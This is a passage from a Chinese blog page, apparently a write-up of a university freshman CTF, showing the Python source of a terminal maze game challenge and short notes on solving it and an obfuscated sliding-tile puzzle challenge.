class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dwmap</span>(<span class="params"><span class="built_in">map</span></span>):<span class="comment">#画地图</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">1</span>,<span class="built_in">map</span>[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">1</span>,<span class="built_in">map</span>[<span class="number">1</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> i == -<span class="number">1</span> <span class="keyword">or</span> i == <span class="built_in">map</span>[<span class="number">0</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> j == -<span class="number">1</span> <span class="keyword">or</span> j == <span class="built_in">map</span>[<span class="number">1</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;|&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> i == <span class="built_in">map</span>[<span class="number">2</span>] <span class="keyword">and</span> j == <span class="built_in">map</span>[<span class="number">3</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;x&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> i == <span class="built_in">map</span>[<span class="number">4</span>] <span class="keyword">and</span> j == <span class="built_in">map</span>[<span class="number">5</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;o&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;HP:<span class="subst">&#123;<span class="built_in">map</span>[<span class="number">6</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_height</span>(<span class="params"><span class="built_in">map</span>,x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span>[<span class="number">7</span>][x][y]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params"><span class="built_in">chr</span>,<span class="built_in">map</span></span>):<span class="comment">#走一步</span></span><br><span class="line">    nxtx = <span class="number">0</span></span><br><span class="line">    nxty = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span> == <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        nxtx = <span class="built_in">map</span>[<span class="number">2</span>]-<span class="number">1</span></span><br><span class="line">        nxty = <span class="built_in">map</span>[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">chr</span> == <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        nxtx = <span class="built_in">map</span>[<span class="number">2</span>]</span><br><span class="line">        nxty = <span class="built_in">map</span>[<span class="number">3</span>]-<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">chr</span> == <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        nxtx = <span class="built_in">map</span>[<span class="number">2</span>]+<span class="number">1</span></span><br><span class="line">        nxty = <span class="built_in">map</span>[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">chr</span> == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        nxtx = <span class="built_in">map</span>[<span class="number">2</span>]</span><br><span class="line">        nxty = <span class="built_in">map</span>[<span class="number">3</span>]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nxtx&lt;<span class="number">0</span> <span class="keyword">or</span> nxtx&gt;=<span class="built_in">map</span>[<span class="number">0</span>] <span class="keyword">or</span> nxty&lt;<span class="number">0</span> <span class="keyword">or</span> nxty&gt;=<span class="built_in">map</span>[<span class="number">1</span>]:<span class="comment">#out</span></span><br><span class="line">        <span class="built_in">map</span>[<span class="number">6</span>]-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> get_height(<span class="built_in">map</span>,<span class="built_in">map</span>[<span class="number">2</span>],<span class="built_in">map</span>[<span class="number">3</span>]) &gt;= get_height(<span class="built_in">map</span>,nxtx,nxty):<span class="comment">#success</span></span><br><span class="line">        <span class="keyword">if</span> get_height(<span class="built_in">map</span>,<span class="built_in">map</span>[<span class="number">2</span>],<span class="built_in">map</span>[<span class="number">3</span>]) &gt; get_height(<span class="built_in">map</span>,nxtx,nxty):</span><br><span class="line">            <span class="comment"># cls()</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;click&quot;</span>)</span><br><span class="line">        <span class="built_in">map</span>[<span class="number">2</span>] = nxtx</span><br><span class="line">        <span class="built_in">map</span>[<span class="number">3</span>] = nxty</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> get_height(<span class="built_in">map</span>,<span class="built_in">map</span>[<span class="number">2</span>],<span class="built_in">map</span>[<span class="number">3</span>]) &lt; get_height(<span class="built_in">map</span>,nxtx,nxty):<span class="comment">#fail</span></span><br><span class="line">        <span class="built_in">map</span>[<span class="number">6</span>]-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">babygame</span>(<span class="params"><span class="built_in">map</span></span>):</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        cls()</span><br><span class="line">        dwmap(<span class="built_in">map</span>)</span><br><span class="line">        <span class="built_in">chr</span> = <span class="built_in">input</span>(<span class="string">&quot;input w,a,s,d:&quot;</span>)</span><br><span class="line">        <span class="built_in">map</span> = run(<span class="built_in">chr</span>,<span class="built_in">map</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">map</span>[<span class="number">6</span>] == <span class="number">0</span>:</span><br><span class="line">            cls()</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span><span class="comment">#fail</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">map</span>[<span class="number">2</span>] == <span class="built_in">map</span>[<span class="number">4</span>] <span class="keyword">and</span> <span class="built_in">map</span>[<span class="number">3</span>] == <span class="built_in">map</span>[<span class="number">5</span>]:</span><br><span class="line">            cls()</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span><span class="comment">#success</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dwstandend</span>(<span class="params">x,y,<span class="built_in">map</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Your start pos is(<span class="subst">&#123;x&#125;</span>,<span class="subst">&#123;y&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Your target pos is(<span class="subst">&#123;<span class="built_in">map</span>[<span class="number">4</span>]&#125;</span>,<span class="subst">&#123;<span class="built_in">map</span>[<span class="number">5</span>]&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;HP:<span class="subst">&#123;<span class="built_in">map</span>[<span class="number">6</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You should konw where you are :)&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hardgame</span>(<span class="params"><span class="built_in">map</span></span>):</span><br><span class="line">    stpx = <span class="built_in">map</span>[<span class="number">2</span>]</span><br><span class="line">    stpy = <span class="built_in">map</span>[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        cls()</span><br><span class="line">        dwstandend(stpx,stpy,<span class="built_in">map</span>)</span><br><span class="line">        <span class="built_in">chr</span> = <span class="built_in">input</span>(<span class="string">&quot;input w,a,s,d:&quot;</span>)</span><br><span class="line">        <span class="built_in">map</span> = run(<span class="built_in">chr</span>,<span class="built_in">map</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">map</span>[<span class="number">6</span>] == <span class="number">0</span>:</span><br><span class="line">            cls()</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span><span class="comment">#fail</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">map</span>[<span class="number">2</span>] == <span class="built_in">map</span>[<span class="number">4</span>] <span class="keyword">and</span> <span class="built_in">map</span>[<span class="number">3</span>] == <span class="built_in">map</span>[<span class="number">5</span>]:</span><br><span class="line">            cls()</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span><span class="comment">#success</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;通过天才难度即可获得flag，只有一关哦&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;GL &amp;&amp; HF  :&gt;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请选择难度：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1.笨蛋&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2.天才&quot;</span>)</span><br><span class="line">    hard = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(hard) == <span class="number">1</span>:</span><br><span class="line">        ans = babygame(babymap1)</span><br><span class="line">        <span class="keyword">if</span> ans == <span class="number">1</span>:</span><br><span class="line">            dwmap(babymap1)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;It is ez,right?&quot;</span>)</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;click any button to continue&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            cls()</span><br><span class="line">            ans = babygame(babymap2)</span><br><span class="line">            <span class="keyword">if</span> ans == <span class="number">1</span>:</span><br><span class="line">                dwmap(babymap2)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;wow,you are so good!&quot;</span>)</span><br><span class="line">                <span class="built_in">input</span>(<span class="string">&quot;click any button to continue&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line">                cls()</span><br><span class="line">                ans = babygame(babymap3)</span><br><span class="line">                <span class="keyword">if</span> ans == <span class="number">1</span>:</span><br><span class="line">                    dwmap(babymap3)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;congratulations,you win Novice level!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;but that is too ez,you need to win the harder level&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;you fail!!&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;you fail!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You fail!&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">int</span>(hard) == <span class="number">2</span>:</span><br><span class="line">        ans = hardgame(babymap4)</span><br><span class="line">        <span class="keyword">if</span> ans == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;wow,you are the real maze king&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag&#123;xxxxxxxxxx&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;you fail!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag&#123;This_1s_fack_flag_HackER :( &#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>当然细心的你也会发现，出题人为了偷懒，hard难度的地图和easy难度第二关是一样的</p>
<p>实际上easy难度的第三关会更难一些，因为有很多下去就上不来的点</p>
<p>Have Fun :)  </p>
<h2 id="Puzzle"><a href="#Puzzle" class="headerlink" title="Puzzle"></a>Puzzle</h2><p>有趣的小游戏。</p>
<p>通过分析源码，第一直觉是我们要对一个数组排序，然后有个调换格式。</p>
<p>通过梳理 fixed 函数中的比较逻辑，我们可以给字符串编号（或者直接拿去md5解密也行，出题人偷懒直接对数字编号加密混淆的）</p>
<p>我们再观察 do_idx 里的 valid 数组，大致可以发现这类似于走迷宫对于越界的判断的操作，而那一个 stuff 数组本质是一个 4x4 的方格，每次移动相当于调换两个位置上的数。</p>
<p>最后就是经典win7小游戏数字华容道了，你可以照着一些方法自己手玩，也可以找网上一些公开的。</p>
<p><a target="_blank" rel="noopener" href="https://weiyinfu.cn/pintu/index.html">https://weiyinfu.cn/pintu/index.html</a></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/NUSTCTF/" rel="tag"># NUSTCTF</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/p/d103d518.html" rel="prev" title="南京理工大学2022萌新杯">
                  <i class="fa fa-angle-left"></i> 南京理工大学2022萌新杯
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/p/ab40d10f.html" rel="next" title="南京理工大学2023萌新杯">
                  南京理工大学2023萌新杯 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">C.A.T.</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
